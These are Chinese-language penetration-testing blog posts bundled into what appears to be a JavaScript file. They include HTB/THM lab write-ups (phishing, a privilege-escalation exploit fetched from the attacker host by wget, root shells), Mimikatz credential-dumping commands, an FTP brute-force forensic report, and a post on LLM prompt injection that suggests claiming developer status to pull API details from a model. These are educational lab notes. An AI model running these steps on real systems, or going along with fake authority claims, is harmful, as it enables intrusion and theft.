创建反弹 shell 的可执行文件并替换原文件
![](assets/img/Pasted%20image%2020241122182139.png)

4. 等待自动化运行，获取 SYSTEM 权限：
![](assets/img/Pasted%20image%2020241122182036.png)

## 📚 知识点回顾

### 1. 信息收集技巧
- **端口扫描**
  - 使用 \`naabu\` 快速扫描
  - 使用 \`nmap\` 进行详细版本探测
- **服务枚举**
  - SMTP 服务配置分析
  - Active Directory 域环境识别
  - Web 服务版本识别

### 2. 攻击技术
- **邮件钓鱼**
  - XLL 文件攻击绕过宏限制
  - HTA 文件执行技巧
- **域内渗透**
  - BloodHound 域内信息收集
  - PowerView 密码修改
  - 自动化任务劫持

### 3. 权限提升技巧
- **横向移动**
  - 利用域用户权限
  - WinRM 远程连接
- **纵向提升**
  - 文件权限分析
  - 系统服务替换
  - 自动化任务利用

## 🎯 总结

### 攻击链回顾
1. 通过邮件系统投递 XLL 文件获取初始访问
2. 利用 HTA 文件获取更稳定的 shell
3. 使用 BloodHound 发现域内提权路径
4. 通过 PowerView 修改域用户密码
5. 利用自动化任务获取系统权限

### 防御建议
1. **邮件安全**
   - 严格限制附件类型
   - 实施邮件安全网关
2. **域环境加固**
   - 严格控制域用户权限
   - 定期审计域内权限
3. **系统加固**
   - 限制自动化任务权限
   - 加强文件系统权限控制

### 工具总结
- **信息收集**：naabu、nmap
- **域内渗透**：BloodHound、PowerView
- **权限提升**：WinPEAS
- **远程连接**：Evil-WinRM
`,f=`---
title: Web中间件-Tomcat9-CVE-2020-1938
tags:
  - 应用中间件
  - Tomcat
categories:
  - 网络安全
date: 2024-09-27
---

![ ](../assets/img/image-111.png)


端口扫描
![alt text](../assets/img/image-112.png)

tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。

https://github.com/leonooo13/CNVD-2020-10487-Tomcat-Ajp-lfi

![alt text](../assets/img/image-114.png)`,w=`---
title: CobalStrike指南
---
一直没在用过CS今天玩一玩
`,P=`---
title: 流量分析-数字取证
tags:
  - 报告
  - 流量分析
password: lidefei
---
Obtain Information

- **Forensic Tool**: Wireshark
- **Traffic Capture File**: 2024_part_4.pcap  	MD5 (4780F5090FBC44BCF58D2B989D569A68) 
- **Source IP**: 192.168.56.1 
- **Destination IP**: 192.168.56.101 
- **First Packet Timestamp**: 2014-01-15 01:37:24
- **Last Packet Timestamp**: 2014-01-15 01:38:23
- **Elapsed Time**: 00:00:59

---
**Sources of Evidence**

![](../assets/img/Pasted%20image%2020241127224013.png)


**Network Intrusion Analysis**

Based on the captured network packets, the client (192.168.56.1) attempts to log into the FTP server (192.168.56.101) multiple times. By analyzing the FTP protocol commands, such as \`USER\` and \`PASS\`, along with the server's responses, it is observed that the client attempted to log in 30 times with different passwords (e.g., "1" and "2"), and all attempts failed.

This behavior is consistent with a password enumeration attack, where the client repeatedly tries different passwords until the login is successful or the attack is aborted.

---

**Key Evidence Analysis**

1. **Packet Capture**:
    
    - In the FTP session, the client sends a \`USER\` command to provide a username, followed by a \`PASS\` command to send the password. The server’s responses (e.g., 331 code asking for a password, 530 code indicating a failed login) reveal multiple login attempts by the client.
2. **Traffic Flow Analysis**:
    
    - Through the Wireshark capture, we observe all interactions between the client and the server, including login requests, server responses, failed login attempts, and subsequent \`QUIT\` commands to close the connection.
3. **Repeated Login Attempts**:
    
    - The client repeatedly sends \`USER\` and \`PASS\` commands with different passwords. The server responds with \`530 Login incorrect\` each time, indicating that the login attempts were unsuccessful.
4. **Traffic Analysis Result**:
    
    - After 30 password attempts, the client ceases its login attempts. Key packets include:
        
\`\`\`
6   0.006512   192.168.56.1   192.168.56.101   FTP   76   Request: USER bro
8   0.009093   192.168.56.101  192.168.56.1    FTP   98   Response: 331 Password required for bro.
10  0.009567   192.168.56.1    192.168.56.101  FTP   74   Request: PASS 1
12  2.371080   192.168.56.101  192.168.56.1    FTP   88   Response: 530 Login incorrect.
14  2.371558   192.168.56.1    192.168.56.101  FTP   72   Request: QUIT
16  2.371849   192.168.56.101  192.168.56.1    FTP   80   Response: 221 Goodbye.

\`\`\`

---

**Resut**

**Conclusion**:

- The client with IP address **192.168.56.1** attempted to log in to the FTP server at **192.168.56.101**, performing multiple password enumeration attempts over a duration of **1 minute** (from **2014-01-15 01:37:24** to **2014-01-15 01:38:23**).
- Each attempt involved sending different passwords, with all login attempts being unsuccessful. This indicates an **FTP password enumeration brute force attack**.
- The attack lasted for **59 seconds**, during which the attacker tried a total of **30 different passwords**, and all attempts were rejected by the FTP server.
- This type of activity is typical of an attacker attempting to gain unauthorized access by systematically testing a range of passwords, exploiting weak authentication mechanisms.


This report highlights potential security threats on the network and provides practical recommendations to enhance network security and protect against unauthorized access attempts.`,T=`---
title: GoldenEye
tags:
  - 靶场
  - THM
description:
---
## 题目描述

> 难度：
> 描述：
> 前置条件：

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息       |
| --- | ----------- | ------------ |
| IP  | 10.17.5.121 | 10.10.112.90 |
| OS  | kali        | Linxu        |

## 信息搜集

### 端口扫描

端口信息
\`\`\`
PORT      STATE SERVICE REASON
25/tcp    open  smtp    syn-ack
80/tcp    open  http    syn-ack
55006/tcp open  unknown syn-ack
55007/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds

|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/pop3 syn-ack Dovecot pop3d
|_pop3-capabilities: CAPA TOP SASL(PLAIN) AUTH-RESP-CODE USER RESP-CODES UIDL PIPELINING
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d039 2e71 c76a 2cb3 e694 ec40 7228 ec63
| SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd
| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3
| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr
| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/
| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM
| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w
| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi
| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi
| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45
| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a
| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so
| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm
| e1/vPH7tRtldZFSfflyHUsA=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     syn-ack Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE USER RESP-CODES TOP SASL(PLAIN) STLS PIPELINING UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d039 2e71 c76a 2cb3 e694 ec40 7228 ec63
| SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd
| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3
| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr
| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/
| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM
| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w
| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi
| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi
| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45
| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a
| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so
| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm
| e1/vPH7tRtldZFSfflyHUsA=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:38
Completed NSE at 20:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:38
Completed NSE at 20:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:38
Completed NSE at 20:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.11 seconds


\`\`\`

### 路径枚举


信息泄露
\`Boris\`

\`\`\`
\`&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;\` 是 **HTML 实体编码**（HTML Character Entities），其中每个 \`&#x;\` 表示一个字符的 Unicode 编码。具体来说，这些数字是字符的 Unicode 代码点（十进制表示）。

让我们将每个数字转换为对应的字符：

1. \`&#73;\` = **I**
2. \`&#110;\` = **n**
3. \`&#118;\` = **v**
4. \`&#105;\` = **i**
5. \`&#110;\` = **n**
6. \`&#99;\` = **c**
7. \`&#105;\` = **i**
8. \`&#98;\` = **b**
9. \`&#108;\` = **l**
10. \`&#101;\` = **e**
11. \`&#72;\` = **H**
12. \`&#97;\` = **a**
13. \`&#99;\` = **c**
14. \`&#107;\` = **k**
15. \`&#51;\` = **3**
16. \`&#114;\` = **r**

将这些字符拼接起来，得到的字符串是：

**"InvincibleHack3r"**

因此，\`&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;\` 是 **"InvincibleHack3r"** 的 HTML 实体编码。

这是一种通过使用数字编码（Unicode 代码点）来表示文本字符的方式，通常用于防止 HTML 中的特殊字符被浏览器错误解析或显示。
\`\`\`



## 漏洞发现

凭证

\`\`\`
boris
InvincibleHack3r
\`\`\`


\`\`\`
端口 55007
\`\`\`


\`\`\`
Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris
\`\`\`


![](../assets/img/Pasted%20image%2020241118205552.png)
secret1!
## pop命令

\`\`\`
nc pop.example.com 110
# Server: +OK POP3 server ready
USER test@example.com
# Server: +OK User accepted
PASS mysecretpassword
# Server: +OK Mailbox locked and ready
STAT
# Server: +OK 2 3200
LIST
# Server: +OK 2 messages:
# Server: 1 1600
# Server: 2 1600
RETR 1
# Server: (邮件内容)
QUIT
# Server: +OK Goodbye
\`\`\`



\`\`\`
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
\`\`\`


\`\`\`
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
\`\`\`


![](../assets/img/Pasted%20image%2020241118211658.png)


\`\`\`
username: xenia
password: RCP90rulez!
\`\`\`

![](../assets/img/Pasted%20image%2020241118212131.png)

hyrda pop3

doak
goat

email
Username — dr_doak & Password — 4England!


![](../assets/img/Pasted%20image%2020241118212629.png)


\`\`\`
└─$ exiftool for-007.jpg
ExifTool Version Number         : 13.00
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2018:04:25 08:40:02+08:00
File Access Date/Time           : 2024:11:18 21:27:37+08:00
File Inode Change Date/Time     : 2024:11:18 21:27:37+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
\`\`\`

\`\`\`
┌──(kali㉿LeoBook)-[~/seclab]
└─$ echo "eFdpbnRlcjE5OTV4IQ=="|base64 -d
xWinter1995x!
\`\`\`


![](../assets/img/Pasted%20image%2020241118213042.png)

![](../assets/img/Pasted%20image%2020241118213448.png)

## 漏洞利用


![](../assets/img/Pasted%20image%2020241118215501.png)

![](../assets/img/Pasted%20image%2020241118215517.png)

## webshell


\`\`\`
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$

\`\`\`

## usershell

## rootshell

\`\`\`
www-data@ubuntu:/tmp$ wget 10.17.5.121:8888/cc.c
--2024-11-18 06:13:27--  http://10.17.5.121:8888/cc.c
Connecting to 10.17.5.121:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5120 (5.0K) [text/x-csrc]
Saving to: 'cc.c'

100%[==========================================================================>] 5,120       --.-K/s   in 0s

2024-11-18 06:13:27 (29.3 MB/s) - 'cc.c' saved [5120/5120]

www-data@ubuntu:/tmp$ cc cc.c -o c
cc.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
cc.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
cc.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
cc.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
cc.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
www-data@ubuntu:/tmp$ ./c
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
\`\`\`

\`\`\`
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# find / -name *flag* 2>/dev/null
\`\`\`

## 知识点回顾
## 总结

`,y=`---
title: HTB-Certified
tags:
  - 靶场
description: 
password: lidefei
---
> 

## 靶场概述

难度： 
描述：

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息 |
| --- | ----------- | ------ |
| IP  | 10.17.5.121 |        |
| OS  | kali        |        |

---
## 信息搜集



## 攻击向量



## 漏洞利用


## 提权


## 知识点回顾
## 总结

`,C=`---
title: University
password: lidefei
tags:
  - hackthebox
---

## 信息搜集

本机ip: 10.10.16.18
目标ip: 10.10.11.39

### 端口扫描
\`\`\`bash
❯ cat naabu.txt                                                                                                                
10.10.11.39:80                                                                                                                 
10.10.11.39:135
10.10.11.39:53
10.10.11.39:139
10.10.11.39:445
10.10.11.39:88
10.10.11.39:389
kali@kali ~/Documents/htb/University 
❯ awk -F ':' '{print $2}'                                                                                                      
^C⏎                                                                                     kali@kali ~/Documents/htb/University [130]
❯ awk -F ':' '{print $2}' naabu.txt                                                                                            
80                                                                                                                             
135
53
139
445
88
389
kali@kali ~/Documents/htb/University 
❯ awk -F ':' '{print $2}' naabu.txt|paste -sd ',' -                                                                            
80,135,53,139,445,88,389                                                                                                       
kali@kali ~/Documents/htb/University 
❯ nmap -sCV -p 80,135,53,139,445,88,389 .10.11.39 -oN namp.txt -T4                                                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-14 03:57 EST                                                             
Failed to resolve ".10.11.39".
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.20 seconds
kali@kali ~/Documents/htb/University 
❯ nmap -sCV -p 80,135,53,139,445,88,389 10.10.11.39 -oN namp.txt -T4                                                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-14 03:57 EST                                                             
Nmap scan report for 10.10.11.39
Host is up (0.49s latency).

PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://university.htb/
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-14 15:44:28Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-14T15:44:56
|_  start_date: N/A
|_clock-skew: 6h46m53s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.90 seconds
⏎                                                              

\`\`\`


### http

手工测试 http://university.htb/

![](../assets/img/Pasted%20image%2020241114170834.png)

\`\`\`bash
dirsearch -u http://university.htb 
\`\`\`

### webshell

\`\`\`bash
https://github.com/c53elyas/CVE-2023-33733
\`\`\``,x=`---
title: LLM攻击
tags: [Sec, AI]
categories: [Sec]
---

## 什么是大型语言模型？

大型语言模型 （LLM） 是一种 AI 算法，可以处理用户输入并通过预测单词序列来创建合理的响应。他们在巨大的半公开数据集上接受训练，使用机器学习来分析语言的各个组成部分如何组合在一起。
LLM 通常提供一个聊天界面来接受用户输入，称为提示。允许的输入部分由 input validation rules 控制。
LLM 在现代网站中可以有广泛的用例：
客户服务，例如虚拟助手。
译本。
SEO 改进。
分析用户生成的内容，例如跟踪页面评论的语气。

# LLM 攻击和提示注入

许多 Web LLM 攻击依赖于一种称为提示注入的技术。这是攻击者使用构建的提示来纵 LLM 输出的地方。提示注入可能会导致 AI 采取超出其预期目的的作，例如对敏感 API 进行错误调用或返回不符合其准则的内容。

# 检测 LLM 漏洞

我们推荐的检测 LLM 漏洞的方法是：
确定 LLM 的输入，包括直接 （如提示） 和间接 （如训练数据） 输入。
确定 LLM 可以访问哪些数据和 API。
探测这个新的攻击面是否存在漏洞。】

# 利用 LLM API、函数和插件

LLM 通常由专门的第三方提供商托管。网站可以通过描述供 LLM 使用的本地 API 来为第三方 LLM 提供对其特定功能的访问权限。
例如，客户支持 LLM 可能有权访问管理用户、订单和库存的 API。

# LLM API 的工作原理

将 LLM 与 API 集成的工作流程取决于 API 本身的结构。调用外部 API 时，某些 LLM 可能要求客户端调用单独的函数终端节点（实际上是私有 API），以便生成可发送到这些 API 的有效请求。此作的工作流可能如下所示：
客户端使用用户的提示符调用 LLM。
LLM 检测到需要调用函数并返回一个 JSON 对象，其中包含符合外部 API 架构的参数。
客户端使用提供的参数调用函数。
客户端处理函数的响应。
客户端再次调用 LLM，将函数响应附加为新消息。
LLM 使用函数 response 调用外部 API。
LLM 总结了此 API 调用的结果，并将其返回给用户。
此工作流程可能会产生安全隐患，因为 LLM 实际上是代表用户调用外部 API，但用户可能不知道这些 API 正在被调用。理想情况下，在 LLM 调用外部 API 之前，应向用户显示确认步骤。

# 映射 LLM API 攻击面

术语“过度代理”是指 LLM 可以访问可以访问敏感信息的 API，并可能被说服以不安全的方式使用这些 API。这使攻击者能够将 LLM 推到其预期范围之外，并通过其 API 发起攻击。
使用 LLM 攻击 API 和插件的第一阶段是找出 LLM 可以访问哪些 API 和插件。一种方法是简单地询问 LLM 它可以访问哪些 API。然后，您可以询问有关任何感兴趣的 API 的更多详细信息。
如果 LLM 不合作，请尝试提供误导性的上下文并重新提出问题。例如，您可以声称您是 LLM 的开发人员，因此应该具有更高级别的权限。
`,E=`---
title: Linux 服务器取证
tags:
  - "#数字取证"
---
> 通过分析受损的服务器，了解在 Linux 服务器上发现的数字取证伪影

您受雇调查 ACME 网页设计的数据泄露事件。使用以下凭证通过 SSH 登录到目标计算机：


| 目标机器         | 本地机器        |
| ------------ | ----------- |
| 10.10.19.215 | 10.17.5.121 |


发现 后面

![](../assets/img/Pasted%20image%2020241127172907.png)

![](../assets/img/Pasted%20image%2020241127173017.png)`,k=`---
title: Mimikatzwindwos凭证获取
tags:
  - 安全工具
  - 网络安全
---
**Mimikatz** 是一个开源的、功能强大的安全工具，广泛用于渗透测试和网络安全审计。由 Benjamin Delpy 开发，它的主要功能是提取 Windows 系统中的用户凭证，包括密码、哈希、PIN 等。Mimikatz 通常用于模拟真实攻击以验证系统的安全性，并协助管理员理解和改进 Windows 系统的安全防护措施。

### Mimikatz 的主要功能

1. **内存中提取明文密码**：能够从 Windows 系统的 LSASS 进程中提取出明文密码，但需要管理员权限。
  
2. **提取 NTLM 和 Kerberos Hash**：可以获取 NTLM 和 Kerberos 哈希，供攻击者使用其他工具进行哈希传递攻击 (Pass-the-Hash)。

3. **Pass-the-Hash (PTH) 攻击**：允许使用提取的 NTLM 哈希，而不需要明文密码，从而模拟用户身份。

4. **Pass-the-Ticket (PTT) 攻击**：利用 Kerberos ticket（TGT或TGS）进行攻击，实现对目标系统的访问。

5. **金票 (Golden Ticket)**：Mimikatz 可以生成一个有效的伪造 Kerberos TGT，从而获得对目标域环境的持久访问权限。

6. **银票 (Silver Ticket)**：生成伪造的服务票据 (TGS) 来访问特定的服务。

7. **权限提升**：通过利用 Windows 系统的漏洞提升用户权限。

### 使用 Mimikatz 的基本步骤

1. **启动 Mimikatz**：
   下载并运行 Mimikatz，通常需要管理员权限或 SYSTEM 权限。

2. **启用权限**：
   使用以下命令来启用所需权限：
   \`\`\`mimikatz
   privilege::debug
   \`\`\`

3. **提取密码或哈希**：
   - 提取明文密码：
     \`\`\`mimikatz
     sekurlsa::logonpasswords
     \`\`\`
   - 获取 NTLM 哈希：
     \`\`\`mimikatz
     sekurlsa::logonpasswords
     \`\`\`

### 常见的安全防护措施

由于 Mimikatz 能够轻松提取凭证和模拟攻击，企业通常会采取多层次的防护措施来抵御此类攻击，例如：

- 使用 Windows Credential Guard 和 LSA Protection 来保护凭证。
- 强化用户权限控制，避免不必要的管理员权限分配。
- 定期监控系统日志，识别和阻止恶意活动。

由于其功能强大且潜在的破坏性，Mimikatz 应仅在获得授权的合法渗透测试中使用，不得用于未经许可的入侵或破坏行为。`,L=`---
title: 流量分析-数字取证
tags:
  - 报告
  - 流量分析
password: lidefei
---

# Part4

## 实验环境
取证工具 wireshark
流量包 2024_part_4.pcap


## Source of Evidence

Tapping the wire and the air – Network packets
## 分析过程

前置知识：osi七层模型 tcp协议三次握手四次挥手 ftp

- **\`USER\` 命令**：客户端向服务器发送用户名，服务器返回 331 状态码。
- **\`PASS\` 命令**：客户端发送密码，服务器返回 230（登录成功）。
- **\`RETR\` 或 \`STOR\` 命令**：文件传输开始，服务器响应 150（准备好开始传输数据）。


- **源 IP**: \`192.168.56.1\`（客户端）
- **目标 IP**: \`192.168.56.101\`（FTP 服务器）

![](../assets/img/Pasted%20image%2020241127183406.png)

\`\`\`
1	0.000000	192.168.56.1	192.168.56.101	TCP	78	54017 → 21 [SYN] Seq=0 Win=65535 Len=0 MSS=1460 WS=8 TSval=489244036 TSecr=0 SACK_PERM
\`\`\`

TCP 三次握手的第一步，客户端尝试与 FTP 服务器建立连接。 客户端的源端口是 54017，FTP 服务器的目标端口是 21 (ftp默认端口)  TCP 连接的初始化请求（SYN）客户端请求与服务器建立连接 客户端的序列号(Seq)从 0 开始，表示连接的初始状态。

\`\`\`
2	0.000043	192.168.56.101	192.168.56.1	TCP	74	21 → 54017 [SYN, ACK] Seq=0 Ack=1 Win=14480 Len=0 MSS=1460 SACK_PERM TSval=2590583 TSecr=489244036 WS=128
\`\`\`

TCP 三次握手的第二步，服务器响应客户端的连接请求并确认序列号，服务器的源端口是 21，客户端的目标端口是 54017。服务器的序列号（seq）为 0，表示这是它的响应包。确认号 Ack=1， 服务器确认客户端的序列号为 1，即客户端的 SYN 包的序列号加 1

\`\`\`
3	0.000454	192.168.56.1	192.168.56.101	TCP	66	54017 → 21 [ACK] Seq=1 Ack=1 Win=131768 Len=0 TSval=489244036 TSecr=2590583
\`\`\`

TCP 三次握手 的第三步，客户端确认接收到服务器的响应，从而完成连接建立。
客户端的源端口是 54017，服务器的目标端口是 21，客户端确认服务器的响应，发送了 ACK 包。此时 TCP 连接已经建立

分析可以行为

过滤条传输层的数据帧， 筛选协议为FTP的数据帧

![](../assets/img/Pasted%20image%2020241127190259.png)

分析其数据帧


